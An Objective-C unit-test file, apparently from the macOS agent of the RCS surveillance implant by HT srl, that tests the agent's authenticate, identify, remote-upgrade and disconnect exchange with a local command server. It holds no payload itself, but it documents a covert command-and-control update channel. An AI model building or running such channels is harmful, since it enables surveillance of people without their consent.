/*
 *  UploadNetworkOperationTest.m
 *  RCSMac
 *
 *
 *  Created by revenge on 2/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>

#import "UpgradeNetworkOperation.h"
#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ByeNetworkOperation.h"
#import "RCSMCommon.h"


static NSURL *mURL                      = nil;
static RESTTransport *mTransport        = nil;
static AuthNetworkOperation *mAuth      = nil;
static IDNetworkOperation *mID          = nil;
static UpgradeNetworkOperation *mUp     = nil;
static ByeNetworkOperation *mBye        = nil;

@interface UpgradeNetworkOperationTest : GHTestCase

@end

@implementation UpgradeNetworkOperationTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
  mURL = [[NSURL alloc] initWithString: @"http://192.168.1.153:8080/"];
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
  [mURL release];
}

- (void)setUp
{
  // Run before each test method
  mTransport = [[RESTTransport alloc] initWithURL: mURL
                                           onPort: 8080];
  mAuth  = [[AuthNetworkOperation alloc]
            initWithTransport: mTransport];
  mID    = [[IDNetworkOperation alloc]
            initWithTransport: mTransport];
  mUp    = [[UpgradeNetworkOperation alloc]
            initWithTransport: mTransport];
  mBye   = [[ByeNetworkOperation alloc]
            initWithTransport: mTransport];
}

- (void)tearDown
{
  // Run after each test method
  [mAuth release];
  [mID release];
  [mUp release];
  [mBye release];
  [mTransport release];
}

- (void)testAllocation
{
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  UpgradeNetworkOperation *upOP = [[UpgradeNetworkOperation alloc]
                                   initWithTransport: transport];
  
  GHAssertNotNULL(upOP, nil, @"Error on allocation");
  
  [transport release];
  [upOP release];
}

- (void)testPerform
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_UPGRADE)
        {
          GHTestLog(@"Server requested a file upload");
          //BOOL success = YES;
          
          //id mockTaskManager = [OCMockObject partialMockForObject: [RCSMTaskManager sharedInstance]];
          //[[[mockTaskManager stub] andReturn: OCMOCK_VALUE(success)] _uploadFiles];
          
          result = [mUp perform];
          GHAssertTrue(result, @"upOP went wrong");
          
          i = 1337;
          break;
        }
    }
  
  GHAssertEquals(i, 1337, @"NO upload offered from server");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

- (void)testWithNoRequestFromServer
{
  BOOL result = NO;
  
  result = [mAuth perform];
  GHAssertTrue(result, @"Auth went wrong");
  
  result = [mID perform];
  GHAssertTrue(result, @"idOP went wrong");
  
  NSMutableArray *commandList = [mID getCommands];
  GHTestLog(@"commandList: %@", commandList);
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      if ([[commandList objectAtIndex: i] unsignedIntValue] == PROTO_UPGRADE)
        {
          i = 1337;
          break;
        }
    }
  
  GHAssertNotEquals(i, 1337, @"Server requested PROTO_UPGRADE, can't continue");
  
  result = [mUp perform];
  GHAssertFalse(result, @"upOP should have returned FALSE");
  
  result = [mBye perform];
  GHAssertTrue(result, @"Bye went wrong");
}

@end